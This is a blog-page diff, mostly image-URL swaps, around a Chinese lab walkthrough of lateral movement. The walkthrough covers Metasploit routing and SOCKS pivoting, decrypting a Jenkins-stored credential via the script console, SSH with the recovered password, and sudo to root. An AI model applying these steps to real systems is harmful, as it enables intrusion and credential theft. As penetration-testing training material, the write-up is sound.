 <h2 id="🔀-横向移动到-30（Jenkins）"><a href="#🔀-横向移动到-30（Jenkins）" class="headerlink" title="🔀 横向移动到 .30（Jenkins）"></a>🔀 横向移动到 .30（Jenkins）</h2><p>进去之后发现有个用户叫 <code>jenkins</code>：</p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image38.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image38.png"></p>
 <p>合理怀疑这台机器跑了 Jenkins 服务。查一下本机监听的端口：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -tlnp</span><br></pre></td></tr></table></figure>
 
 <blockquote>
 <p>参数说明：<code>-t</code> TCP &#x2F; <code>-l</code> 监听中 &#x2F; <code>-n</code> 数字显示 &#x2F; <code>-p</code> 显示进程</p>
 </blockquote>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image39.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image39.png"></p>
 <p>果然有 <code>8080</code> 端口在监听，但之前 nmap 外部扫描没扫到，说明<strong>这个服务只对内网开放</strong>。</p>
 <p>直接从外部访问果然不行：</p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image40.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image40.png"></p>
 <p>在 <code>.10</code> 机器上试试：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://172.16.250.30:8080</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image41.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image41.png"></p>
 <p>有响应！那就在 <code>.10</code> 建立 SOCKS 代理节点，把流量代理过去。</p>
 <hr>
 <h2 id="🧭-建立-SOCKS-代理穿透内网"><a href="#🧭-建立-SOCKS-代理穿透内网" class="headerlink" title="🧭 建立 SOCKS 代理穿透内网"></a>🧭 建立 SOCKS 代理穿透内网</h2><p>退回 MSF session（<strong>不要 <code>ctrl+c</code> 或 <code>exit</code>，会话会直接中断！</strong> 用 <code>background</code>）：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">background</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image42.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image42.png"></p>
 <h3 id="建立路由"><a href="#建立路由" class="headerlink" title="建立路由"></a>建立路由</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use multi/manage/autoroute</span><br><span class="line"><span class="built_in">set</span> session 4</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
 
 <p>让流量通过 <code>.10</code> 机器走。</p>
@@ -383,14 +383,14 @@
 <p>确认模块运行状态：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">jobs</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image43.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image43.png"></p>
 <h3 id="配置-proxychains"><a href="#配置-proxychains" class="headerlink" title="配置 proxychains"></a>配置 proxychains</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># /etc/proxychains4.conf</span></span><br><span class="line">socks4 127.0.0.1 1080</span><br></pre></td></tr></table></figure>
 
 <blockquote>
 <p>尝试用 <code>proxychains firefox</code> 结果不好使，有限制，比较麻烦，直接改浏览器代理配置更省事。</p>
 </blockquote>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image44.png"></p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image45.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image44.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image45.png"></p>
 <p>可以正常访问了！</p>
 <blockquote>
 <p>💡 <strong>原理说明：</strong> 流量走 <code>127.0.0.1:1080</code>，MSF 监听到数据后通过 <code>.10</code> 节点转发给 <code>.30</code> 机器，实现外部访问内网服务。</p>
@@ -401,15 +401,15 @@
 
 <p><strong>方式一：浏览器插件（推荐）</strong></p>
 <p>配置 SOCKS4 代理指向 Kali IP:1080，启动就能访问了。</p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image46.png"></p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image47.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image46.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image47.png"></p>
 <p><strong>方式二：代理工具（Proxifier）</strong></p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image48.png"></p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image49.png"></p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image50.png"></p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image51.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image48.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image49.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image50.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image51.png"></p>
 <p>结果测试半天浏览器就是不走流量，试了半天才知道是软件问题</p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260321150416364.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260321150416364.png"></p>
 <blockquote>
 <p>⚠️ 注意：Proxifier <strong>Portable Edition（非安装版）不注入系统驱动</strong>，无法拦截任意进程的流量，Applications 写 <code>Any</code> 完全没用。所以这里用 Portable 版试了半天没反应，换回浏览器插件解决。</p>
 </blockquote>
@@ -417,7 +417,7 @@
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl --socks4 172.16.250.128:1080 http://172.16.250.30:8080/</span><br></pre></td></tr></table></figure>
 
 <p>有正常回显，通信没问题。</p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260321150507432.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260321150507432.png"></p>
 <hr>
 <h2 id="🔑-Jenkins-凭据窃取"><a href="#🔑-Jenkins-凭据窃取" class="headerlink" title="🔑 Jenkins 凭据窃取"></a>🔑 Jenkins 凭据窃取</h2><p>继续访问 Jenkins：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.16.250.30:8080/jenkins/</span><br></pre></td></tr></table></figure>
@@ -425,25 +425,25 @@
 <blockquote>
 <p>💡 直接访问 <code>8080</code> 是 Tomcat，Jenkins 路径是 <code>/jenkins/</code>，用proxchains dirsearch还把msf扫崩了，翻wp才知道路径是&#x2F;jenkins&#x2F;……</p>
 </blockquote>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image54.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image54.png"></p>
 <p>点进去可以看到有两个凭据账户：</p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image55.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image55.png"></p>
 <p><strong>第一个：root 账户</strong></p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image56.png"></p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image57.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image56.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image57.png"></p>
 <p>就是之前从 <code>.10</code> 拿到的那个 SSH 私钥，对应 <code>.30</code> 的 root 登录。</p>
 <p><strong>第二个：db_backup 账户</strong></p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image58.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image58.png"></p>
 <p>密码前端是隐藏的，简单改改</p>
 <p>发现一段加密字符串：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2M0vgELkx9OMFTP8UCoNNneTI7CVjBr9sKSCtKoUl08=</span><br></pre></td></tr></table></figure>
 
 <p>这是数据库用户（<code>.50</code> 机器）的密码，明显加密了，需要解密。</p>
 <p>Jenkins 自带脚本控制台，可以直接解密：</p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image59.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image59.png"></p>
 <figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">println hudson.util.Secret.decrypt(<span class="string">&quot;2M0vgELkx9OMFTP8UCoNNneTI7CVjBr9sKSCtKoUl08=&quot;</span>)</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image60.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image60.png"></p>
 <p>解密得到明文密码：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">)uDvra&#123;4UL^;r?*h</span><br></pre></td></tr></table></figure>
 
@@ -454,7 +454,7 @@
 <h2 id="🎯-横向移动到-50（数据库服务器）"><a href="#🎯-横向移动到-50（数据库服务器）" class="headerlink" title="🎯 横向移动到 .50（数据库服务器）"></a>🎯 横向移动到 .50（数据库服务器）</h2><p>拿到密码，可以直接 SSH 连接 <code>.50</code> 的数据库备份账户：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh db_backup@172.16.250.50</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image61.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image61.png"></p>
 <p>看一下 sudo 权限：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> -l</span><br></pre></td></tr></table></figure>
 
@@ -462,7 +462,7 @@
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> su</span><br></pre></td></tr></table></figure>
 
 <p>✅ 成功获取 <code>.50</code> 数据库服务器的 root 权限！</p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image62.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image62.png"></p>
 <hr>
 <h2 id="📊-完整攻击链回顾"><a href="#📊-完整攻击链回顾" class="headerlink" title="📊 完整攻击链回顾"></a>📊 完整攻击链回顾</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">[kali外网]</span><br><span class="line">  │</span><br><span class="line">  ▼</span><br><span class="line">.10 (172.16.250.10)</span><br><span class="line">  ├─ Struts2 CVE-2017-5638 → RCE (tomcat权限)</span><br><span class="line">  ├─ DirtyCOW 40616 → root提权</span><br><span class="line">  ├─ 读取 opencms.properties → 发现数据库IP(.50)</span><br><span class="line">  └─ 读取 ~/.ssh/id_rsa → SSH私钥</span><br><span class="line">  │</span><br><span class="line">  ▼</span><br><span class="line">.30 (172.16.250.30)</span><br><span class="line">  ├─ SSH私钥免密登录 root</span><br><span class="line">  ├─ Jenkins 8080 仅内网开放</span><br><span class="line">  ├─ MSF autoroute + socks_proxy 穿透内网</span><br><span class="line">  └─ Jenkins 脚本控制台解密凭据</span><br><span class="line">  │</span><br><span class="line">  ▼</span><br><span class="line">.50 (172.16.250.50)</span><br><span class="line">  ├─ db_backup + 解密密码 SSH登录</span><br><span class="line">  └─ sudo su → root</span><br></pre></td></tr></table></figure>
 
@@ -928,7 +928,7 @@
 </script>
 
 <!-- required -->
-<script src="/js/main.js?v=mp5bt8m9" defer></script>
+<script src="/js/main.js?v=mp5jbj9v" defer></script>
 
 <script type="text/javascript">
   const applyTheme = (theme) => {
@@ -1192,7 +1192,7 @@
 <script src="/js/plugins/hotkeys.js"></script>
 
 <!-- Achievements / Card System -->
-<script src="/js/plugins/achievements.js?v=mp5bt8ma"></script>
+<script src="/js/plugins/achievements.js?v=mp5jbj9v"></script>
 
 <!-- Special Days - 节日彩蛋系统 -->
 <script src="/js/plugins/special-days.js"></script>
